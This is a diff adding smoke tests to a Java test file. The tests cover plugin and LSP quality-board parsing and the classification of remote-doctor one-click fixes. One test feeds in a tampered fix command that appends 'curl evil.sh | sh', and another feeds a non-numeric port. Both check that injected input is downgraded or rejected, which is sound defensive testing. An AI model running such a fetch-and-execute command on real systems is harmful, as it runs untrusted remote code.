@@ -75,6 +75,8 @@ public final class PureLogicSmokeMain {
         sessionsWorkbench();
         artifacts();
         policyViewer();
+        pluginQuality();
+        remoteDoctorFixes();
         bundleParity();
 
         System.out.println("\n=== PureLogicSmokeMain: " + passed + " passed, " + failed + " failed ===");
@@ -1712,6 +1714,143 @@ public final class PureLogicSmokeMain {
         eq(PolicyViewer.summaryLine(null, null, null),
                 "permissions: n/a · denials: n/a · auto-mode: n/a",
                 "pv summary n/a");
+    }
+
+    /**
+     * PluginQuality — the plugin/LSP quality board core (gap #11, VS
+     * plugin-quality.js twin): tolerant parsers, honest lsp verdict
+     * derivation (unknown never fabricated), flag rules (lsp-only NOT
+     * unused, no slow flag) and the text board render.
+     */
+    private static void pluginQuality() {
+        System.out.println("PluginQuality (plugin/LSP quality board — VS plugin-quality.js twin)");
+        eq(PluginQuality.buildPluginValidateArgs("/p"),
+                Arrays.asList("plugin", "validate", "/p", "--json"), "pq validate args");
+        eq(PluginQuality.buildCodeIntelStatusArgs(),
+                Arrays.asList("code-intel", "status", "--json"), "pq status args");
+        check(PluginQuality.parsePluginValidate("not json") == null, "pq validate unreadable null");
+        PluginQuality.Validation lspOnly = PluginQuality.parsePluginValidate(
+                "{\"ok\":true,\"componentCounts\":{\"lsp\":1},"
+                        + "\"components\":{\"lsp\":[{\"languageId\":\"mylang\","
+                        + "\"command\":\"mylang-ls\"}]}}");
+        eq(lspOnly.counts.get("lsp"), 1, "pq lsp count parsed");
+        eq(lspOnly.lsp.get(0).id, "mylang-ls", "pq lsp id falls back to command");
+        check(PluginQuality.parseCodeIntelStatus("{}") == null, "pq status without servers null");
+        List<PluginQuality.StatusServer> down = PluginQuality.parseCodeIntelStatus(
+                "{\"servers\":[{\"languageId\":\"mylang\",\"id\":\"mylang-ls\","
+                        + "\"available\":false}]}");
+        eq(PluginQuality.deriveLspAvailability(lspOnly.lsp, down), "unavailable",
+                "pq own server down -> unavailable");
+        eq(PluginQuality.deriveLspAvailability(lspOnly.lsp, null), "unknown",
+                "pq no probe -> unknown (never fabricated)");
+        eq(PluginQuality.deriveLspAvailability(lspOnly.lsp,
+                Arrays.asList(new PluginQuality.StatusServer("mylang", "someone-else", true))),
+                "unknown", "pq different server -> unknown");
+        eq(PluginQuality.deriveLspAvailability(new ArrayList<PluginQuality.LspEntry>(), down),
+                "none", "pq no declared lsp -> none");
+
+        Map<String, Object> p = new LinkedHashMap<String, Object>();
+        p.put("name", "lsp-only");
+        p.put("version", "1.0.0");
+        p.put("scope", "user");
+        p.put("dir", "/p");
+        p.put("ok", Boolean.TRUE);
+        Map<String, PluginQuality.Validation> vals =
+                new LinkedHashMap<String, PluginQuality.Validation>();
+        vals.put("lsp-only", lspOnly);
+        List<PluginQuality.Row> rows =
+                PluginQuality.buildQualityRows(Arrays.asList(p), vals, down);
+        eq(rows.get(0).unused, Boolean.FALSE, "pq lsp-only is NOT unused");
+        eq(rows.get(0).lsp, "unavailable", "pq row lsp verdict");
+        check(PluginQuality.flagsFor(rows.get(0)).contains("lsp unavailable"),
+                "pq flag rendered");
+        check(!PluginQuality.flagsFor(rows.get(0)).toString().contains("slow"),
+                "pq no fabricated slow flag");
+
+        List<PluginQuality.Row> degraded = PluginQuality.buildQualityRows(
+                Arrays.asList(p), new LinkedHashMap<String, PluginQuality.Validation>(), null);
+        check(degraded.get(0).broken == null && degraded.get(0).unused == null
+                && "unknown".equals(degraded.get(0).lsp), "pq missing validate degrades honestly");
+        check(PluginQuality.buildQualityRows(null, vals, null) == null,
+                "pq unreadable plugin list -> null");
+        check(PluginQuality.describe(null, true).contains("could not read plugins"),
+                "pq describe unreadable state");
+        check(PluginQuality.describe(new ArrayList<PluginQuality.Row>(), true)
+                .contains("No runtime plugins installed"), "pq describe empty state");
+        check(PluginQuality.summaryLine(rows, false).contains("lsp probe: unavailable"),
+                "pq summary probe warning");
+    }
+
+    /**
+     * RemoteDoctorFixes — one-click fix classification/generation (gap #12,
+     * VS remote-doctor-fixes.js twin): three tiers off real analyze checks,
+     * allowlist teeth, .ps1 invariants (elevation/idempotent/ASCII/injection-
+     * proof) and the JB-specific Remote Development host check.
+     */
+    private static void remoteDoctorFixes() {
+        System.out.println("RemoteDoctorFixes (one-click fixes — VS remote-doctor-fixes.js twin)");
+        RemoteDoctor.Signals s = new RemoteDoctor.Signals();
+        s.isWsl = true;
+        s.cliFound = true;
+        s.cliVersion = "0.162.100";
+        s.minCliVersion = "0.162.150";
+        s.bridgePort = 51234;
+        s.portProbe = "unknown";
+        List<RemoteDoctor.Check> checks = RemoteDoctor.analyze(s).checks;
+        List<RemoteDoctorFixes.Fix> fixes = RemoteDoctorFixes.classifyFixes(checks);
+        boolean auto = false, scriptTier = false, manual = false;
+        for (RemoteDoctorFixes.Fix f : fixes) {
+            if ("cli-outdated".equals(f.id)) {
+                auto = RemoteDoctorFixes.KIND_AUTO.equals(f.kind)
+                        && "npm install -g chainlesschain@latest".equals(f.command);
+            } else if ("firewall".equals(f.id)) {
+                scriptTier = RemoteDoctorFixes.KIND_SCRIPT.equals(f.kind) && f.port == 51234;
+            } else if ("wsl-networking".equals(f.id)) {
+                manual = RemoteDoctorFixes.KIND_MANUAL.equals(f.kind)
+                        && RemoteDoctorFixes.ACT_WSLCONFIG.equals(f.actionType);
+            }
+        }
+        check(auto, "rdf autoApplicable tier (allowlisted npm)");
+        check(scriptTier, "rdf scriptable tier (validated port)");
+        check(manual, "rdf manualOnly tier (wslconfig)");
+
+        String ps1 = RemoteDoctorFixes.buildFirewallFixScript(checks);
+        check(ps1.startsWith("#Requires -RunAsAdministrator\r\n"), "rdf elevation header first line");
+        check(ps1.contains("already exists - skipping"), "rdf idempotency guard");
+        check(ps1.chars().allMatch(c -> c <= 0x7F), "rdf script pure ASCII");
+        check(ps1.contains("$ports = @(51234)"), "rdf only validated digits embedded");
+        RemoteDoctorFixes.WslConfigPatch patch = RemoteDoctorFixes.buildWslConfigPatch(checks);
+        eq(patch.ini, "[wsl2]\nnetworkingMode=mirrored\n", "rdf wslconfig ini");
+        eq(patch.postStep, "wsl --shutdown", "rdf wslconfig post step");
+
+        List<RemoteDoctorFixes.Fix> hostile = RemoteDoctorFixes.classifyFixes(Arrays.asList(
+                new RemoteDoctor.Check("warn", "cli-outdated", "t", "d",
+                        "npm install -g chainlesschain@latest && curl evil.sh | sh")));
+        check(RemoteDoctorFixes.KIND_MANUAL.equals(hostile.get(0).kind)
+                && RemoteDoctorFixes.ACT_COPY.equals(hostile.get(0).actionType),
+                "rdf tampered command degrades to copy-only");
+        check(RemoteDoctorFixes.buildFirewallFixScript(Arrays.asList(
+                new RemoteDoctor.Check("warn", "firewall", "t", "d", "localport=evil"))) == null,
+                "rdf non-numeric port -> no script");
+
+        RemoteDoctor.Signals rd = new RemoteDoctor.Signals();
+        rd.remoteDevClient = true;
+        rd.cliFound = true;
+        rd.cliVersion = "0.162.156";
+        rd.minCliVersion = "0.162.150";
+        rd.bridgePort = 51234;
+        rd.portProbe = "listening";
+        RemoteDoctor.Result r = RemoteDoctor.analyze(rd);
+        boolean infoCheck = false;
+        for (RemoteDoctor.Check c : r.checks) {
+            if ("jb-remote-dev".equals(c.id) && "info".equals(c.level)
+                    && c.detail.contains("HOST")) {
+                infoCheck = true;
+            }
+        }
+        check(infoCheck, "rdf remote-dev host advisory present (info level)");
+        eq(r.level, "ok", "rdf info never degrades the verdict");
+        check(r.summary.contains("ℹ"), "rdf info icon in summary");
     }
 
     /**
